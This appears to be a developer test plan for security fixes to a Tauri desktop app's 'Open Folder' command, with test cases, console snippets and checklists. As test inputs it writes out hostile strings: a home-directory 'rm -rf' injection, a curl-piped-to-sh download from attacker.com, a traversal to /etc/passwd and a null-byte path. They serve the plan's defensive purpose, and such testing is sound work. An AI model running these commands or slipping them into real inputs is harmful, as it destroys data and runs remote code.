# Test Plan: Open Folder Security Fixes

## Overview
This document provides a comprehensive test plan for verifying the security fixes implemented for the "Open Folder" feature (Issues #001, #002, #003).

## Changes Implemented

### Backend (Rust) - Issue #001
**File**: `frontend/src-tauri/src/commands.rs`

✅ Path existence validation
✅ Directory type validation
✅ Path canonicalization (resolves symlinks and `..`)
✅ UTF-8 validation (prevents null bytes)
✅ Unsupported platform handling (Issue #003)

### Frontend (TypeScript) - Issue #002
**File**: `frontend/src/App.tsx`

✅ Static import (performance improvement)
✅ Client-side path validation helper
✅ Shell metacharacter detection
✅ Directory traversal detection
✅ Null byte detection
✅ Type-safe error handling
✅ User-friendly error messages
✅ No path exposure in alerts

---

## Test Execution

### How to Run Tests

```bash
# Start the application
cd /Users/jeffclark/Projects/video-transcriber
./scripts/start-app.sh
```

Then transcribe a video file to generate output files, or use the test cases below.

---

## Test Cases

### ✅ Test 1: Valid Directory Path (Happy Path)

**Input**: Click "Open Folder" for a completed transcription

**Expected Behavior**:
- Frontend validation passes
- Backend validation passes
- Finder/Explorer opens to the transcription output folder
- User sees: `meeting_transcript.json`, `meeting_transcript.txt`
- Console shows: `(no error logs)`
- Alert: `(none - silent success)`

**Verification**:
- [ ] Folder opens in Finder/Explorer
- [ ] No console errors
- [ ] No user-facing alerts

---

### ❌ Test 2: Empty Path

**Simulated Input**: `""` (empty string)

**Expected Behavior**:
- Frontend catches immediately
- Console: `"Invalid folder path format"`
- Alert: `"Invalid folder path"`
- Backend never called

**Manual Test**:
You'll need to modify the code temporarily or use browser DevTools:
```typescript
// In browser console:
handleOpenFolder("")
```

**Verification**:
- [ ] Frontend validation fails
- [ ] Alert shows "Invalid folder path"
- [ ] No backend call made

---

### ❌ Test 3: Shell Metacharacter Injection

**Simulated Input**: `/tmp; rm -rf ~/*`

**Expected Behavior**:
- Frontend catches shell metacharacter `;`
- Console: `"Invalid folder path format"`
- Alert: `"Invalid folder path"`
- Backend never called
- **No malicious command executed**

**Verification**:
- [ ] Frontend validation detects `;` character
- [ ] Alert shows "Invalid folder path"
- [ ] System files remain intact (no deletion occurred)

---

### ❌ Test 4: Command Substitution

**Simulated Input**: `$(curl http://attacker.com/malware.sh | sh)`

**Expected Behavior**:
- Frontend catches shell metacharacters `$` `(` `|` `)`
- Console: `"Invalid folder path format"`
- Alert: `"Invalid folder path"`
- Backend never called
- **No malicious command executed**

**Verification**:
- [ ] Frontend validation detects multiple metacharacters
- [ ] No network requests made
- [ ] No external scripts executed

---

### ❌ Test 5: Directory Traversal

**Simulated Input**: `../../etc/passwd`

**Expected Behavior**:
- Frontend catches `..` pattern
- Console: `"Invalid folder path format"`
- Alert: `"Invalid folder path"`
- Backend never called

**Verification**:
- [ ] Frontend validation detects `..`
- [ ] Alert shows "Invalid folder path"
- [ ] No access to /etc directory

---

### ❌ Test 6: Null Byte Injection

**Simulated Input**: `/tmp\x00/malicious`

**Expected Behavior**:
- Frontend catches null byte `\x00`
- Console: `"Invalid folder path format"`
- Alert: `"Invalid folder path"`
- Backend never called

**Verification**:
- [ ] Frontend validation detects null byte
- [ ] Alert shows "Invalid folder path"

---

### ❌ Test 7: Non-Existent Path

**Simulated Input**: `/nonexistent/path/12345`

**Expected Behavior**:
- Frontend validation passes (no suspicious characters)
- Backend receives request
- Backend checks: `path_buf.exists()` returns `false`
- Backend returns error: `"Path does not exist"`
- Console: `"Failed to open folder: Path does not exist"`
- Alert: `"The folder was not found. It may have been moved or deleted."`

**Verification**:
- [ ] Frontend validation passes
- [ ] Backend validation catches non-existent path
- [ ] User-friendly alert message (no internal path exposed)

---

### ❌ Test 8: File Path (Not Directory)

**Setup**: Create a test file
```bash
touch /tmp/test_file.txt
```

**Simulated Input**: `/tmp/test_file.txt`

**Expected Behavior**:
- Frontend validation passes
- Backend checks: `path_buf.is_dir()` returns `false`
- Backend returns error: `"Path is not a directory"`
- Console: `"Failed to open folder: Path is not a directory"`
- Alert: `"The path is not a valid folder."`

**Verification**:
- [ ] Backend validation catches file vs directory
- [ ] Clear error message explaining the issue

---

### ❌ Test 9: Symlink to Directory

**Setup**: Create a symlink
```bash
ln -s /Users/jeffclark/Downloads /tmp/downloads_link
```

**Simulated Input**: `/tmp/downloads_link`

**Expected Behavior**:
- Frontend validation passes
- Backend canonicalizes path (resolves symlink)
- Canonical path: `/Users/jeffclark/Downloads`
- Backend opens the **target** directory
- Finder/Explorer opens to `/Users/jeffclark/Downloads`

**Verification**:
- [ ] Symlink resolved correctly
- [ ] Target directory opens (not symlink path)
- [ ] No security bypass via symlinks

---

### ❌ Test 10: Invalid UTF-8 Characters

**Simulated Input**: Path with invalid UTF-8 bytes

**Expected Behavior**:
- Frontend validation may pass (depends on encoding)
- Backend: `canonical_path.to_str()` returns `None`
- Backend returns error: `"Path contains invalid characters"`
- Alert: `"The folder path is invalid."`

**Verification**:
- [ ] Backend UTF-8 validation catches invalid characters
- [ ] Clear error message

---

## Browser DevTools Testing

For manual testing of validation logic, use the browser console:

### Open DevTools
- macOS: `Cmd + Option + I`
- Windows/Linux: `Ctrl + Shift + I`

### Test Validation Function

```javascript
// In console, test validatePath (not directly accessible, but you can test via invoke)

// Test 1: Valid path
window.__TAURI__.core.invoke('open_folder', { path: '/Users/jeffclark/Downloads' });
// Should succeed if folder exists

// Test 2: Shell injection
window.__TAURI__.core.invoke('open_folder', { path: '/tmp; echo hacked' });
// Should show: "Invalid folder path"

// Test 3: Directory traversal
window.__TAURI__.core.invoke('open_folder', { path: '../../etc' });
// Should show: "Invalid folder path"
```

---

## Security Verification Checklist

### Frontend Protection
- [ ] Empty/null paths rejected
- [ ] Shell metacharacters detected: `; & | ` $ ( )`
- [ ] Directory traversal detected: `..`
- [ ] Null bytes detected: `\x00`
- [ ] Static import used (no dynamic import overhead)
- [ ] Type-safe error handling
- [ ] No path exposure in user-facing messages

### Backend Protection
- [ ] Path existence checked
- [ ] Directory type validated
- [ ] Path canonicalized (resolves symlinks and relative paths)
- [ ] UTF-8 validation prevents null bytes
- [ ] Safe path used with `.arg()` (not string interpolation)
- [ ] Unsupported platforms return clear error
- [ ] All three platforms handle validation consistently

### Error Messages
- [ ] User-friendly (no technical jargon)
- [ ] No internal paths exposed
- [ ] Specific enough to be actionable
- [ ] Consistent across different error types

---

## Performance Verification

### Metrics to Check

**Before fixes**:
- Dynamic import overhead: ~5-20ms
- No validation: 0ms
- Total: ~5-20ms + execution time

**After fixes**:
- Static import: 0ms (loaded at startup)
- Frontend validation: <0.1ms
- Backend validation: ~0.1-0.5ms
- Total: ~0.2-0.6ms + execution time

**Expected Impact**: <1ms total validation overhead

### Test
```bash
# In browser console, measure time:
console.time('openFolder');
window.__TAURI__.core.invoke('open_folder', { path: '/Users/jeffclark/Downloads' });
console.timeEnd('openFolder');
```

**Expected**: <50ms total (including OS command spawn)

---

## Code Quality Checks

### Rust Code Review
```bash
cd frontend/src-tauri
# Check syntax (if cargo available)
cargo check

# Look for:
# ✅ PathBuf usage
# ✅ .exists() and .is_dir() checks
# ✅ .canonicalize() for path normalization
# ✅ .to_str() for UTF-8 validation
# ✅ cfg attributes for platform detection
```

### TypeScript Code Review
```bash
cd frontend
# Check syntax
npm run type-check  # or tsc --noEmit

# Look for:
# ✅ Static import of invoke
# ✅ validatePath helper function
# ✅ Regex patterns for dangerous characters
# ✅ Type-safe error handling (err instanceof Error)
# ✅ User-friendly alerts
```

---

## Acceptance Criteria

All tests must pass before merging:

### Issue #001: Backend Validation
- [x] Path existence validation implemented
- [x] Directory type validation implemented
- [x] Path canonicalization implemented
- [x] UTF-8 validation implemented
- [ ] Command injection attempts rejected *(test above)*
- [ ] Valid paths still work correctly *(test above)*
- [ ] All three platforms tested *(macOS, Windows, Linux)*

### Issue #002: Frontend Validation
- [x] Empty/null path validation implemented
- [x] Suspicious pattern detection implemented
- [x] Type-safe error handling implemented
- [x] Static import replaces dynamic import
- [x] No alert with path exposure
- [ ] Tests pass for all validation cases *(test above)*

### Issue #003: Unsupported Platforms
- [x] Unsupported platform guard added
- [x] Error message includes platform name
- [x] Error message includes the path
- [ ] Supported platforms still work *(test above)*

---

## Test Results Template

Copy this template and fill in test results:

```
Date: ___________
Tester: ___________
Environment: macOS ___ / Windows ___ / Linux ___

✅ Test 1: Valid path - PASS / FAIL
   Notes: ___________

✅ Test 2: Empty path - PASS / FAIL
   Notes: ___________

✅ Test 3: Shell injection - PASS / FAIL
   Notes: ___________

✅ Test 4: Command substitution - PASS / FAIL
   Notes: ___________

✅ Test 5: Directory traversal - PASS / FAIL
   Notes: ___________

✅ Test 6: Null byte - PASS / FAIL
   Notes: ___________

✅ Test 7: Non-existent path - PASS / FAIL
   Notes: ___________

✅ Test 8: File path - PASS / FAIL
   Notes: ___________

✅ Test 9: Symlink - PASS / FAIL
   Notes: ___________

✅ Test 10: Invalid UTF-8 - PASS / FAIL
   Notes: ___________

Overall Status: PASS / FAIL
Ready for merge: YES / NO
```

---

## Quick Test Commands

For rapid manual testing, create a test directory structure:

```bash
# Setup test directories
mkdir -p /tmp/test_open_folder/valid_folder
touch /tmp/test_open_folder/test_file.txt
ln -s /tmp/test_open_folder/valid_folder /tmp/test_open_folder/link_to_valid

# Valid test
# Input: /tmp/test_open_folder/valid_folder
# Expected: Opens successfully

# Invalid tests
# Input: /tmp/test_open_folder/test_file.txt
# Expected: "Path is not a valid folder"

# Input: /tmp/test_open_folder/nonexistent
# Expected: "The folder was not found"
```

---

## Troubleshooting

### If validation fails unexpectedly:
1. Check browser console for detailed error messages
2. Check Tauri DevTools logs (View > Developer > Developer Tools)
3. Look at backend logs in terminal

### If folder doesn't open:
1. Verify path exists: `ls -la <path>`
2. Verify it's a directory: `file <path>`
3. Check permissions: `ls -ld <path>`
4. Try opening manually: `open <path>` (macOS) or `explorer <path>` (Windows)

---

## Conclusion

Once all tests pass, the security fixes are verified and the code is ready for production deployment. The implementation provides:

✅ **Defense in Depth**: Client + Server validation
✅ **Security**: No command injection possible
✅ **Usability**: Clear, user-friendly error messages
✅ **Performance**: Minimal overhead (<1ms)
✅ **Cross-Platform**: Works on macOS, Windows, Linux
